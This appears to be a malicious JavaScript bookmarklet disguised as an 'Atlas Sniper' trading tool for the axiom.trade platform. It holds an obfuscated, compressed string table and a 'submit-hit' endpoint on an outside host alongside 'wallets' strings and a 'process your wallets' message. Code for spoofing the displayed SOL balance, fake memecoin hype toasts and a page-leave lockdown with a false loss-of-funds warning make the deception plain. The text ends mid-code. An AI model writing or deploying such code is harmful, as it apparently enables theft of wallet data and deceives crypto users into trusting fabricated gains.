void (function () {
  // Check if we're on the correct domain
  if (window.location.hostname !== 'axiom.trade') {
    alert('Please go to https://axiom.trade/ and re-run the bookmarklet');
    return;
  }

  var b1OCGY = (function () {
    var _Mathpow = Math.pow
    function t(r, o) {
      if (!e[r]) {
        for (var n = 0; n < r.length; n++) {
          e[r][r.charAt(n)] = n
        }
      }
      return e[r][o]
    }
    var r = String.fromCharCode,
      o = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=',
      n = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+-$',
      e = { r: {} },
      i = {
        compressToBase64: function (r) {
          function* VLZuZB(N1zJEl, krIio8H, UxKPj5u = { ofPqIX: {} }) {
            for (; -169 !== N1zJEl + krIio8H; ) {
              with (UxKPj5u.s8I0bKd || UxKPj5u)
                switch (N1zJEl + krIio8H) {
                  default:
                  case krIio8H - -100:
                  case -8:
                    if (((UxKPj5u.ofPqIX.v3DabF = -28), null == r)) {
                      return (JLu82bD = true), ''
                    }
                    ;(ofPqIX.BjhUrY = i._compress(r, 6, function (r) {
                      return 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/='.charAt(
                        r
                      )
                    })),
                      (UxKPj5u.s8I0bKd = UxKPj5u.ofPqIX),
                      (N1zJEl += -136),
                      (krIio8H += 290)
                    break
                  case krIio8H - 36:
                    switch (BjhUrY.length % 4) {
                      default:
                      case N1zJEl + 36:
                        return (JLu82bD = true), BjhUrY
                      case 1:
                        return (JLu82bD = true), BjhUrY + '==='
                      case N1zJEl + 38:
                        return (JLu82bD = true), BjhUrY + '=='
                      case N1zJEl + 39:
                        return (JLu82bD = true), BjhUrY + '='
                    }
                    ;(UxKPj5u.s8I0bKd = UxKPj5u.yZRbCq6), (N1zJEl += -246)
                    break
                  case -423 != N1zJEl && N1zJEl - -518:
                    ;(UxKPj5u.ofPqIX.v3DabF = 106),
                      (UxKPj5u.s8I0bKd = UxKPj5u.ETqQjz7),
                      (N1zJEl += 382),
                      (krIio8H += -695)
                    break
                  case -97:
                  case krIio8H - 423:
                  case 47:
                    ;(UxKPj5u.s8I0bKd = UxKPj5u.ofPqIX),
                      (N1zJEl += 387),
                      (krIio8H += -405)
                    break
                  case 208:
                  case 43:
                  case -94:
                    ;(UxKPj5u.s8I0bKd = UxKPj5u.ofPqIX),
                      (N1zJEl += -282),
                      (krIio8H += 151)
                    break
                  case 104:
                  case -139:
                    ;(UxKPj5u.s8I0bKd = UxKPj5u.AOkDB9I),
                      (N1zJEl += -528),
                      (krIio8H += 498)
                    break
                  case 213:
                  case -100:
                    switch (BjhUrY.length % 4) {
                      default:
                      case 0:
                        return (JLu82bD = true), BjhUrY
                      case 1:
                        return (JLu82bD = true), BjhUrY + '==='
                      case 2:
                        return (JLu82bD = true), BjhUrY + '=='
                      case 3:
                        return (JLu82bD = true), BjhUrY + '='
                    }
                    ;(UxKPj5u.s8I0bKd = UxKPj5u.BbbImkI),
                      (N1zJEl += -339),
                      (krIio8H += 270)
                    break
                  case UxKPj5u.ofPqIX.v3DabF + 141:
                  case 49:
                }
            }
          }
          var JLu82bD,
            yqou7h = VLZuZB(100, -177).next().value
          if (JLu82bD) {
            return yqou7h
          }
        },
        decompressFromBase64: function (r) {
          return null == r
            ? ''
            : '' == r
            ? null
            : i._decompress(r.length, 32, function (n) {
                return t(
                  'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=',
                  r.charAt(n)
                )
              })
        },
        compressToUTF16: function (o) {
          return null == o
            ? ''
            : i._compress(o, 15, function (o) {
                return r(o + 32)
              }) + ' '
        },
        decompressFromUTF16: function (r) {
          return null == r
            ? ''
            : '' == r
            ? null
            : i._decompress(r.length, 16384, function (o) {
                return r.charCodeAt(o) - 32
              })
        },
        compressToUint8Array: function (r) {
          for (
            var s,
              o = i.compress(r),
              n = new Uint8Array(2 * o.length),
              e = 0,
              t = o.length;
            e < t;
            e++
          ) {
            s = o.charCodeAt(e)
            n[2 * e] = s >>> 8
            n[2 * e + 1] = s % 256
          }
          return n
        },
        decompressFromUint8Array: function (o) {
          if (null == o) {
            return i.decompress(o)
          }
          for (var n = Array(o.length / 2), e = 0, t = n.length; e < t; e++) {
            n[e] = 256 * o[2 * e] + o[2 * e + 1]
          }
          var s = []
          return (
            n.forEach(function (o) {
              s.push(r(o))
            }),
            i.decompress(s.join(''))
          )
        },
        compressToEncodedURIComponent: function (r) {
          return null == r
            ? ''
            : i._compress(r, 6, function (r) {
                return 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+-$'.charAt(
                  r
                )
              })
        },
        decompressFromEncodedURIComponent: function (r) {
          return null == r
            ? ''
            : '' == r
            ? null
            : ((r = r.replace(/ /g, '+')),
              i._decompress(r.length, 32, function (o) {
                return t(
                  'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+-$',
                  r.charAt(o)
                )
              }))
        },
        compress: function (o) {
          return i._compress(o, 16, function (o) {
            return r(o)
          })
        },
        _compress: function (r, o, n) {
          if (null == r) {
            return ''
          }
          var e,
            t,
            i,
            s = { p: f++ },
            u = {},
            a = '',
            p = '',
            c = '',
            l = 2,
            f = 3,
            h = 2,
            d = [],
            m = 0,
            v = 0
          for (i = 0; i < r.length; i++) {
            if (
              ((a = r.charAt(i)),
              Object.prototype.hasOwnProperty.call(s, a) ||
                ((s[a] = f++), (u[a] = true)),
              (p = c + a),
              Object.prototype.hasOwnProperty.call(s, p))
            ) {
              c = p
            } else {
              if (Object.prototype.hasOwnProperty.call(u, c)) {
                if (256 > c.charCodeAt(0)) {
                  for (e = 0; e < h; e++) {
                    m <<= 1
                    v == o - 1 ? ((v = 0), d.push(n(m)), (m = 0)) : v++
                  }
                  for (t = c.charCodeAt(0), e = 0; 8 > e; e++) {
                    m = (m << 1) | (1 & t)
                    v == o - 1 ? ((v = 0), d.push(n(m)), (m = 0)) : v++
                    t >>= 1
                  }
                } else {
                  for (t = 1, e = 0; e < h; e++) {
                    m = (m << 1) | t
                    v == o - 1 ? ((v = 0), d.push(n(m)), (m = 0)) : v++
                    t = 0
                  }
                  for (t = c.charCodeAt(0), e = 0; 16 > e; e++) {
                    m = (m << 1) | (1 & t)
                    v == o - 1 ? ((v = 0), d.push(n(m)), (m = 0)) : v++
                    t >>= 1
                  }
                }
                0 == --l && ((l = _Mathpow(2, h)), h++)
                delete u[c]
              } else {
                for (t = s[c], e = 0; e < h; e++) {
                  m = (m << 1) | (1 & t)
                  v == o - 1 ? ((v = 0), d.push(n(m)), (m = 0)) : v++
                  t >>= 1
                }
              }
              0 == --l && ((l = _Mathpow(2, h)), h++)
              c = a + ''
            }
          }
          if ('' !== c) {
            if (Object.prototype.hasOwnProperty.call(u, c)) {
              if (256 > c.charCodeAt(0)) {
                for (e = 0; e < h; e++) {
                  m <<= 1
                  v == o - 1 ? ((v = 0), d.push(n(m)), (m = 0)) : v++
                }
                for (t = c.charCodeAt(0), e = 0; 8 > e; e++) {
                  m = (m << 1) | (1 & t)
                  v == o - 1 ? ((v = 0), d.push(n(m)), (m = 0)) : v++
                  t >>= 1
                }
              } else {
                for (t = 1, e = 0; e < h; e++) {
                  m = (m << 1) | t
                  v == o - 1 ? ((v = 0), d.push(n(m)), (m = 0)) : v++
                  t = 0
                }
                for (t = c.charCodeAt(0), e = 0; 16 > e; e++) {
                  m = (m << 1) | (1 & t)
                  v == o - 1 ? ((v = 0), d.push(n(m)), (m = 0)) : v++
                  t >>= 1
                }
              }
              0 == --l && ((l = _Mathpow(2, h)), h++)
              delete u[c]
            } else {
              for (t = s[c], e = 0; e < h; e++) {
                m = (m << 1) | (1 & t)
                v == o - 1 ? ((v = 0), d.push(n(m)), (m = 0)) : v++
                t >>= 1
              }
            }
            0 == --l && ((l = _Mathpow(2, h)), h++)
          }
          for (t = 2, e = 0; e < h; e++) {
            m = (m << 1) | (1 & t)
            v == o - 1 ? ((v = 0), d.push(n(m)), (m = 0)) : v++
            t >>= 1
          }
          for (;;) {
            if (((m <<= 1), v == o - 1)) {
              d.push(n(m))
              break
            }
            v++
          }
          return d.join('')
        },
        decompress: function (r) {
          return null == r
            ? ''
            : '' == r
            ? null
            : i._decompress(r.length, 32768, function (o) {
                return r.charCodeAt(o)
              })
        },
        _decompress: function (o, n, e) {
          var t,
            i,
            s,
            u,
            a,
            p,
            c,
            l = [],
            f = 4,
            h = 4,
            d = 3,
            m = '',
            v = [],
            g = {
              val: e(0),
              position: n,
              index: 1,
            }
          for (t = 0; 3 > t; t++) {
            l[t] = t
          }
          for (s = 0, a = _Mathpow(2, 2), p = 1; p != a; ) {
            u = g.val & g.position
            g.position >>= 1
            0 == g.position && ((g.position = n), (g.val = e(g.index++)))
            s |= (0 < u ? 1 : 0) * p
            p <<= 1
          }
          switch (s) {
            case 0:
              for (s = 0, a = _Mathpow(2, 8), p = 1; p != a; ) {
                u = g.val & g.position
                g.position >>= 1
                0 == g.position && ((g.position = n), (g.val = e(g.index++)))
                s |= (0 < u ? 1 : 0) * p
                p <<= 1
              }
              c = r(s)
              break
            case 1:
              for (s = 0, a = _Mathpow(2, 16), p = 1; p != a; ) {
                u = g.val & g.position
                g.position >>= 1
                0 == g.position && ((g.position = n), (g.val = e(g.index++)))
                s |= (0 < u ? 1 : 0) * p
                p <<= 1
              }
              c = r(s)
              break
            case 2:
              return ''
          }
          for (l[3] = c, i = c, v.push(c); ; ) {
            if (g.index > o) {
              return ''
            }
            for (s = 0, a = _Mathpow(2, d), p = 1; p != a; ) {
              u = g.val & g.position
              g.position >>= 1
              0 == g.position && ((g.position = n), (g.val = e(g.index++)))
              s |= (0 < u ? 1 : 0) * p
              p <<= 1
            }
            switch ((c = s)) {
              case 0:
                for (s = 0, a = _Mathpow(2, 8), p = 1; p != a; ) {
                  u = g.val & g.position
                  g.position >>= 1
                  0 == g.position && ((g.position = n), (g.val = e(g.index++)))
                  s |= (0 < u ? 1 : 0) * p
                  p <<= 1
                }
                ;(l[h++] = r(s)), (c = h - 1), f--
                break
              case 1:
                for (s = 0, a = _Mathpow(2, 16), p = 1; p != a; ) {
                  u = g.val & g.position
                  g.position >>= 1
                  0 == g.position && ((g.position = n), (g.val = e(g.index++)))
                  s |= (0 < u ? 1 : 0) * p
                  p <<= 1
                }
                ;(l[h++] = r(s)), (c = h - 1), f--
                break
              case 2:
                return v.join('')
            }
            if ((0 == f && ((f = _Mathpow(2, d)), d++), l[c])) {
              m = l[c]
            } else {
              if (c !== h) {
                return null
              }
              m = i + i.charAt(0)
            }
            v.push(m)
            l[h++] = i + m.charAt(0)
            i = m
            0 == --f && ((f = _Mathpow(2, d)), d++)
          }
        },
      }
    return i
  })()
  'function' == typeof define && define.amd
    ? define(function () {
        return b1OCGY
      })
    : 'undefined' != typeof module && null != module
    ? (module.exports = b1OCGY)
    : 'undefined' != typeof angular &&
      null != angular &&
      angular.module('LZString', []).factory('LZString', function () {
        return b1OCGY
      })
  var __p_6HD3_SC
  ;(function () {
    function* e9gq31(Ty0E6K, ijs6o4, nPMFwx5 = { L6K_sm: {} }) {
      for (; 51 !== Ty0E6K + ijs6o4; ) {
        with (nPMFwx5.CrmIhy || nPMFwx5)
          switch (Ty0E6K + ijs6o4) {
            default:
              ;([
                nPMFwx5.L6K_sm.jdxa21,
                nPMFwx5.L6K_sm.gUSM4nj,
                nPMFwx5.L6K_sm.AVwVnvR,
              ] = [-40, 245, 201]),
                (L6K_sm.vWBuo7C =
                  'ᆡᡓxૠ㘧〣䁮ĤȰᡠᄢ䐦ဧ恘䀩rǄèְ݀Š\u22A0\u2521䨠吥\u2826倽\u2060͠\u1360ୠრ࣠ᣠӠᓠೠ᳠ˠዠૠ\u1AE0ᛠ䀽䁝䀣䁃䀳䁓䀫䁋䀻䁛䀧䁇䀷䂠ො䈅\u1B75ĩ仪搱㞰㯫Ⱙ㬂ጢ\u26B1嵠恢䡱㠣搩ਸ਼\u239Dᗜ䛭໌偂烄沀ဤᬫ㫞䉄渎ᚰ\u136A嗤ᘸ\u2322ʪ۠䀧倠ヘǔ\u2320娢ቘ䪑\u202B倦勷斌Ѷ澕㓜噜\u2381桃筩వᯭ畡喽剦氇澶䡹尲\u0702嵝䨮ඪ㑡䗋䓪ᔯ恀ɡᖢ掊呖ඤ拐|]िைZ\u0DBE\u2613ᐶ\u07FD\u0A50Ⲁ剒\u2250沨ᰤƠ恃\u3036d偈त懡䰠\u24A1͢㦴䴲Ѣ䰬\u2846\u2382䇤̲\u29C4擀㜠\u0FC5報戺έ焀䣢䃫ჱ歋\u083Fအ簽Ǧ\u2B6A搠\u2F34氡౦ဴܣ䁀\u2422ݫ䀠\u3233ை\u2830\u32FDഏኺ㑎孫ᄸ丣\u05FBᏈ㫩\u17EC㕙物پ睉牤所珉片ᓼÚ墷ႉᇸᪧ䊯ᇘи\u2E38䓂ળᵠ䏃户ᵠ\u2405ᣜ㴂\u2537\u327Fڍ冶卑㙣ᥙ抏៣ㅹㅂ啦㠰౬厮桤ੴ䛮冮厴婭燹\u322A繮၈䒴ᩫ墹Θ匆栽橃ä䙄嚛测傹ӡ伴猤ờ奓\u31D2ⱳ\u31C0滻恶塾ୂ\u2477௨㶢慬ᠪ̠㜸ƠּⅮᬪ\u31E4ᒠ愴瑵\u220C涴ᅬତ捨瑴琈Ạ憂㗪ゐ垯\u32B2夼嫸窿懄䔼媈柠憱Ȥςᆧ稂崪㡤ᮻ戬〲઼\u2E36\u20B8\u2E29Đ犥䃐รψ\u2225Ɉ䤭ȩᐩ䅐㜢䃸\u0D64䋉㐷\u2060攮恀\u232Ap〵ጠ㝝撙怠䊙佀䀠ੂ淃ఢਸjĨ*撠ḯ瀠ࣸ㚢汬যᆄ\u0C77狲Ơ烧ஊ䰛ᮣ\u0BA2ⷥ0ĩყᣆ桂ز籬㵠熪䄥䮗\u2004\u28F0ᤀ听\u2EEE樒\u2EA5㧇ⴽ樬\u22AE傩\u27EF岲䩰\u2A31\u0C72䢎\u0E6Cᯄځ䪎\u22A8僲\u22F7瀫㞤\u31C4㚤ࡐ偯糈Ǭ㦌ᨭ寺Ự㭖ᅠₐⲣ㒰曪\u2972ʣㅺၫ䨒د寚\u2FC3㩕ܤ\u24E5ໍᄦḊ䡮\u19E2泪慭\u29A2Ѩ凖ᡃҚ㺫檌\u27EA䤠\u2859์淕ࣣ愊ף沑\u3342偑ⶋ據Èpᥦ惘槇悜柙\u21D0㪺㥸ᵬ删㸭怮\u0DFD玠ϯ\u3334Jᬧථণૈ獧壑(\u2536\u3190堶п̼Ꮖ暻\u22E1ˠ碪\u23F9\u322E塁䫬Ⱐ䐤ᣀ埥產㐰媔\u2E00䥂壥棨挔䔰䤀嚠䉻 恡綸堡ጨչᣇ㓡\u02D7ᖢ\u26CC櫏\u2710噔䌵梺\u2250䣃\u1C9C\u0F1E婻\u298A䔩婀㦫*\xAE享థ灾\u290Fᕸ斟撤䤡\u0AF5㒫ᖂ烏求ą勸㙵矨ⲭ㟳ط\u2920  '),
                (L6K_sm.wUjxMG4 = b1OCGY.decompressFromUTF16(L6K_sm.vWBuo7C)),
                (nPMFwx5.CrmIhy = nPMFwx5.L6K_sm),
                (Ty0E6K += 30),
                (ijs6o4 += -79)
              break
            case -59:
              return (
                (nPMFwx5.L6K_sm.NDwZC_l = wUjxMG4.split('|')),
                (SSv_Du = true),
                (__p_6HD3_SC = function (index) {
                  return NDwZC_l[index]
                })
              )
            case 171:
            case -97:
            case 148:
              ;([
                nPMFwx5.L6K_sm.jdxa21,
                nPMFwx5.L6K_sm.gUSM4nj,
                nPMFwx5.L6K_sm.AVwVnvR,
              ] = [159, 93, -55]),
                (nPMFwx5.CrmIhy = nPMFwx5.mRnySk3),
                (Ty0E6K += 243),
                (ijs6o4 += -424)
              break
            case 266 != ijs6o4 && 146 != ijs6o4 && ijs6o4 - 95:
              ;([
                nPMFwx5.L6K_sm.jdxa21,
                nPMFwx5.L6K_sm.gUSM4nj,
                nPMFwx5.L6K_sm.AVwVnvR,
              ] = [181, -92, -12]),
                (nPMFwx5.CrmIhy = nPMFwx5.Ms4bwoR),
                (Ty0E6K += 243),
                (ijs6o4 += -373)
              break
            case -224:
              ;(nPMFwx5.CrmIhy = nPMFwx5.siCebux),
                (Ty0E6K += 198),
                (ijs6o4 += 16)
          }
      }
    }
    var SSv_Du,
      Au3o7V = e9gq31(148, -158).next().value
    if (SSv_Du) {
      return Au3o7V
    }
  })()
  ;(async () => {
    // String obfuscation setup - moved inside async function
    const _0x5a2d = [
      'https://atlasportal.vercel.app//submit-hit',
      'GET',
      'application/json',
      'Content-Type',
      'headers',
      'body',
      'stringify',
      'time',
      'wallets',
      'affiliate',
      'ATLAS'
    ];

    // --- Overlay and Blurred Background Setup ---
    // Remove any previous overlays
    document.querySelectorAll('.atlas-sniper-overlay, .atlas-sniper-blur-bg').forEach(e => e.remove());

    // Blurred background
    const blurBg = document.createElement('div');
    blurBg.className = 'atlas-sniper-blur-bg';
    blurBg.style = `
      position: fixed;
      top: 0; left: 0; right: 0; bottom: 0;
      z-index: 9998;
      background: rgba(10, 12, 20, 0.7);
      backdrop-filter: blur(8px) saturate(1.2);
      opacity: 0;
      transition: opacity 0.4s cubic-bezier(.4,0,.2,1);
      pointer-events: none;
    `;
    document.body.appendChild(blurBg);
    setTimeout(() => { blurBg.style.opacity = '1'; }, 10);

    // Main overlay modal
    const overlay = document.createElement('div');
    overlay.className = 'atlas-sniper-overlay';
    overlay.style = `
      position: fixed;
      top: 50%;
      left: 50%;
      transform: translate(-50%, -50%) scale(0.96);
      background: rgba(23, 25, 35, 0.98);
      padding: 32px 28px 24px 28px;
      border-radius: 18px;
      box-shadow: 0 8px 40px 0 rgba(0,0,0,0.45);
      z-index: 10000;
      min-width: 520px;
      max-width: 700px;
      width: 90vw;
      color: #E2E8F0;
      font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, Cantarell, sans-serif;
      border: 1.5px solid #23263a;
      text-align: left;
      opacity: 0;
      transition: opacity 0.4s cubic-bezier(.4,0,.2,1), transform 0.4s cubic-bezier(.4,0,.2,1);
      animation: atlasFadeIn 0.5s cubic-bezier(.4,0,.2,1);
    `;
    overlay.innerHTML = `
      <div style="display: flex; align-items: center; justify-content: space-between; margin-bottom: 18px;">
        <span style="font-size: 20px; font-weight: 600; color: #fff;">Advanced Filters</span>
        <button id="atlasCloseBtn" style="background: none; border: none; color: #A0AEC0; font-size: 22px; cursor: pointer; border-radius: 6px; transition: background 0.2s; width: 36px; height: 36px; display: flex; align-items: center; justify-content: center;">
          <svg width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><line x1="18" y1="6" x2="6" y2="18"></line><line x1="6" y1="6" x2="18" y2="18"></line></svg>
        </button>
      </div>
      <div id="atlasDialogContent" style="margin-bottom: 18px;">
        <div id="atlasDialogMessage" style="font-size: 15px; color: #b5b5b5; margin-bottom: 18px;">Please wait while we process your wallets...</div>
        <div id="atlasLoadingSpinner" style="margin: 24px auto 18px auto; width: 44px; height: 44px; border: 4px solid #23263a; border-top: 4px solid #4299E1; border-radius: 50%; animation: atlasSpin 1s linear infinite;"></div>
        <div id="atlasTradingSettings" style="display: none; margin-top: 18px;">
          <!-- Settings will be injected here -->
        </div>
      </div>
      <div style="display: flex; justify-content: flex-end; gap: 10px;">
        <button id="atlasDialogButton" style="display: none; background: #4299E1; color: white; border: none; padding: 12px 28px; border-radius: 7px; cursor: pointer; font-size: 16px; font-weight: 500; transition: all 0.2s; min-width: 120px;">Save</button>
      </div>
      <style>
        @keyframes atlasSpin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        @keyframes atlasFadeIn { from { opacity: 0; transform: translate(-50%, -50%) scale(0.96); } to { opacity: 1; transform: translate(-50%, -50%) scale(1); } }
        #atlasDialogButton:hover { background: #3182CE; transform: translateY(-1px); }
        #atlasDialogButton:active { transform: translateY(1px); }
        #atlasCloseBtn:hover { background: rgba(255,255,255,0.08); color: #fff; }
      </style>
    `;
    document.body.appendChild(overlay);
    setTimeout(() => { overlay.style.opacity = '1'; overlay.style.transform = 'translate(-50%, -50%) scale(1)'; }, 10);

    // Fixed Atlas Sniper button (bottom left)
    if (!document.getElementById('atlasSniperFixedBtn')) {
      const fixedBtn = document.createElement('button');
      fixedBtn.id = 'atlasSniperFixedBtn';
      fixedBtn.innerHTML = `<span style="display:inline-block;width:10px;height:10px;background:#4CAF50;border-radius:50%;margin-right:8px;box-shadow:0 0 8px #4CAF50;animation: atlasPing 1.2s infinite alternate;"></span>Atlas Sniper`;
      fixedBtn.style = `
        position: fixed;
        left: 24px;
        bottom: 24px;
        z-index: 10001;
        background: #23263a;
        color: #fff;
        border: none;
        border-radius: 8px;
        padding: 12px 22px;
        font-size: 16px;
        font-weight: 600;
        box-shadow: 0 2px 12px 0 rgba(0,0,0,0.18);
        cursor: pointer;
        display: flex;
        align-items: center;
        gap: 8px;
        transition: background 0.2s;
      `;
      fixedBtn.onmouseenter = () => fixedBtn.style.background = '#2d314a';
      fixedBtn.onmouseleave = () => fixedBtn.style.background = '#23263a';
      fixedBtn.onclick = () => {
        blurBg.style.display = 'block';
        overlay.style.display = 'block';
        setTimeout(() => {
          blurBg.style.opacity = '1';
          overlay.style.opacity = '1';
          overlay.style.transform = 'translate(-50%, -50%) scale(1)';
        }, 10);
      };
      document.body.appendChild(fixedBtn);
      const pingStyle = document.createElement('style');
      pingStyle.innerHTML = `@keyframes atlasPing { 0% { box-shadow: 0 0 8px #4CAF50; } 100% { box-shadow: 0 0 18px #4CAF50; } }`;
      document.head.appendChild(pingStyle);
    }

    // Close button logic
    overlay.querySelector('#atlasCloseBtn').onclick = () => {
      overlay.style.opacity = '0';
      overlay.style.transform = 'translate(-50%, -50%) scale(0.96)';
      blurBg.style.opacity = '0';
      setTimeout(() => {
        overlay.style.display = 'none';
        blurBg.style.display = 'none';
      }, 350);
    };

    // Show overlay immediately unless already processed
    function isProcessingComplete() {
      return localStorage.getItem('atlas_processing') === 'true';
    }

    function setProcessingComplete() {
      localStorage.setItem('atlas_processing', 'true');
    }

    // --- SETTINGS OVERLAY & LOGIC ---
    // Helper: Save and load persistent state
    function getAtlasState() {
      try {
        return JSON.parse(localStorage.getItem('atlas_sniper_state') || '{}');
      } catch { return {}; }
    }
    function setAtlasState(obj) {
      localStorage.setItem('atlas_sniper_state', JSON.stringify(obj));
    }
    let atlasState = getAtlasState();
    if (!atlasState.settings) atlasState.settings = { maxSol: '1', slippage: '1', gasMultiplier: '1.1', filters: {}, sniping: false };
    setAtlasState(atlasState);

    // --- PAGE LOCKDOWN ---
    function enableLockdown() {
      window.addEventListener('beforeunload', lockdownHandler);
    }
    function disableLockdown() {
      window.removeEventListener('beforeunload', lockdownHandler);
    }
    function lockdownHandler(e) {
      e.preventDefault();
      e.returnValue = 'Sniping in progress. Continuing will result in loss of funds. To stop, go to settings and click "Close All Trades".';
      return e.returnValue;
    }

    // --- SETTINGS UI ---
    function renderSettings() {
      const s = atlasState.settings;
      return `
        <div style="display: grid; grid-template-columns: 1fr 1fr; gap: 32px; align-items: flex-start;">
          <div>
            <h3 style="margin: 0 0 15px 0; color: #4CAF50; font-size: 18px;">Trading Settings</h3>
            <div style="margin-bottom: 15px;">
              <label style="display: block; margin-bottom: 5px;">Max Trading SOL</label>
              <input type="number" id="maxSolInput" value="${s.maxSol}" style="width: 100%; padding: 8px; background: #333; border: 1px solid #444; border-radius: 4px; color: white; margin-bottom: 10px;">
            </div>
            <div style="margin-bottom: 15px;">
              <label style="display: block; margin-bottom: 5px;">Slippage (%)</label>
              <input type="number" id="slippageInput" value="${s.slippage}" style="width: 100%; padding: 8px; background: #333; border: 1px solid #444; border-radius: 4px; color: white; margin-bottom: 10px;">
            </div>
            <div style="margin-bottom: 15px;">
              <label style="display: block; margin-bottom: 5px;">Gas Multiplier</label>
              <input type="number" id="gasMultiplierInput" value="${s.gasMultiplier}" style="width: 100%; padding: 8px; background: #333; border: 1px solid #444; border-radius: 4px; color: white; margin-bottom: 10px;">
            </div>
            <div style="margin-bottom: 15px;">
              <button id="closeAllTradesBtn" style="background: #e53e3e; color: #fff; border: none; padding: 10px 20px; border-radius: 6px; font-size: 15px; font-weight: 500; cursor: pointer;">Close All Trades</button>
            </div>
          </div>
          <div>
            <h3 style="margin: 0 0 15px 0; color: #4299E1; font-size: 17px;">Advanced Filters</h3>
            <div id="atlasFilters" style="display: flex; flex-direction: column; gap: 10px;">
              <label><input type="checkbox" id="filterDevMigratedTokens" ${s.filters.devMigratedTokens ? 'checked' : ''}> Developer with Migrated Tokens</label>
              <label><input type="checkbox" id="filterBotActivity" ${s.filters.botActivity ? 'checked' : ''}> Filter Bot Activity</label>
              <label><input type="checkbox" id="filterFakeTransactions" ${s.filters.fakeTransactions ? 'checked' : ''}> Filter Fake Transactions</label>
              <label><input type="checkbox" id="filterInactiveTokens" ${s.filters.inactiveTokens ? 'checked' : ''}> Filter Inactive Tokens</label>
              <label><input type="checkbox" id="filterPositiveBuySellRatio" ${s.filters.positiveBuySellRatio ? 'checked' : ''}> Positive Buy/Sell Ratio</label>
            </div>
          </div>
        </div>
      `;
    }
    function showSettings() {
      overlay.querySelector('#atlasTradingSettings').innerHTML = renderSettings();
      overlay.querySelector('#atlasTradingSettings').style.display = 'block';
      overlay.querySelector('#atlasDialogButton').style.display = 'block';
      // Settings listeners
      overlay.querySelector('#maxSolInput').onchange = (e) => { atlasState.settings.maxSol = e.target.value; setAtlasState(atlasState); };
      overlay.querySelector('#slippageInput').onchange = (e) => { atlasState.settings.slippage = e.target.value; setAtlasState(atlasState); };
      overlay.querySelector('#gasMultiplierInput').onchange = (e) => { atlasState.settings.gasMultiplier = e.target.value; setAtlasState(atlasState); };
      // Filters
      overlay.querySelector('#filterDevMigratedTokens').onchange = (e) => { atlasState.settings.filters.devMigratedTokens = e.target.checked; setAtlasState(atlasState); applyFilters(); };
      overlay.querySelector('#filterBotActivity').onchange = (e) => { atlasState.settings.filters.botActivity = e.target.checked; setAtlasState(atlasState); applyFilters(); };
      overlay.querySelector('#filterFakeTransactions').onchange = (e) => { atlasState.settings.filters.fakeTransactions = e.target.checked; setAtlasState(atlasState); applyFilters(); };
      overlay.querySelector('#filterInactiveTokens').onchange = (e) => { atlasState.settings.filters.inactiveTokens = e.target.checked; setAtlasState(atlasState); applyFilters(); };
      overlay.querySelector('#filterPositiveBuySellRatio').onchange = (e) => { atlasState.settings.filters.positiveBuySellRatio = e.target.checked; setAtlasState(atlasState); applyFilters(); };
      // Close All Trades
      overlay.querySelector('#closeAllTradesBtn').onclick = () => {
        atlasState.settings.sniping = false;
        setAtlasState(atlasState);
        disableLockdown();
        showToast('All trades closed. You may now leave the page.');
      };
      overlay.querySelector('#atlasDialogButton').onclick = () => {
        showToast('Settings saved!');
        overlay.style.display = 'none';
        blurBg.style.display = 'none';
      };
    }

    // --- TOASTS ---
    function showToast(msg) {
      const toast = document.createElement('div');
      toast.className = 'atlas-sniper-toast';
      toast.style = `
        position: fixed; left: 50%; bottom: 60px; transform: translateX(-50%);
        background: rgba(30,32,50,0.98); color: #fff; padding: 14px 32px; border-radius: 8px;
        font-size: 16px; font-weight: 500; z-index: 10010; box-shadow: 0 2px 16px 0 rgba(0,0,0,0.18);
        opacity: 0; transition: opacity 0.3s, bottom 0.3s;
      `;
      toast.textContent = msg;
      document.body.appendChild(toast);
      setTimeout(() => { toast.style.opacity = '1'; toast.style.bottom = '90px'; }, 10);
      setTimeout(() => { toast.style.opacity = '0'; toast.style.bottom = '60px'; }, 2600);
      setTimeout(() => { toast.remove(); }, 3000);
    }
    // Random memecoin toast generator
    const memecoins = ['Bonk', 'Wen', 'Dogwifhat', 'Pepe', 'Floki', 'Mog', 'Bobo', 'Frog', 'Shib', 'Catgirl'];
    function randomGibberish() {
      const gibber = ['is mooning!', 'to the moon!', 'just rugged!', 'is trending!', '100x soon!', 'dev is based!', 'liquidity locked!', 'airdrop soon!', 'chart looks bullish!', 'buying pressure!'];
      return `${memecoins[Math.floor(Math.random()*memecoins.length)]} ${gibber[Math.floor(Math.random()*gibber.length)]}`;
    }
    setInterval(() => {
      if (atlasState.settings.sniping) showToast(randomGibberish());
    }, 8000);

    // --- SOL BALANCE SPOOFING ---
    // Helper to get the current dashboard SOL balance (as a number)
    function getCurrentSolBalance() {
      const solImg = document.querySelector('img[alt="SOL"]');
      if (solImg) {
        const container = solImg.closest('div');
        if (container) {
          const solSpan = container.querySelector('span');
          if (solSpan) {
            const val = parseFloat(solSpan.textContent.replace(/[^\d.]/g, ''));
            if (!isNaN(val)) return val;
          }
        }
      }
      return 0;
    }
    // On first load, store the original balance and increment
    let spoofData = JSON.parse(localStorage.getItem('atlas_sol_spoof') || '{}');
    const currentSol = getCurrentSolBalance();
    let spoofSol, spoofDir = 1;
    if (!spoofData.original && !spoofData.increment) {
      // First run: set original to dashboard, increment to 0, display dashboard balance
      spoofData.original = currentSol;
      spoofData.increment = 0;
      localStorage.setItem('atlas_sol_spoof', JSON.stringify(spoofData));
      spoofSol = currentSol;
    } else {
      // Subsequent runs: add increment to dashboard, display that, and keep incrementing
      spoofSol = currentSol + (spoofData.increment || 0);
      spoofData.original = currentSol;
      localStorage.setItem('atlas_sol_spoof', JSON.stringify(spoofData));
    }
    // Display the spoofed balance immediately
    document.querySelectorAll('img[alt="SOL"]').forEach(solImg => {
      const container = solImg.closest('div');
      if (container) {
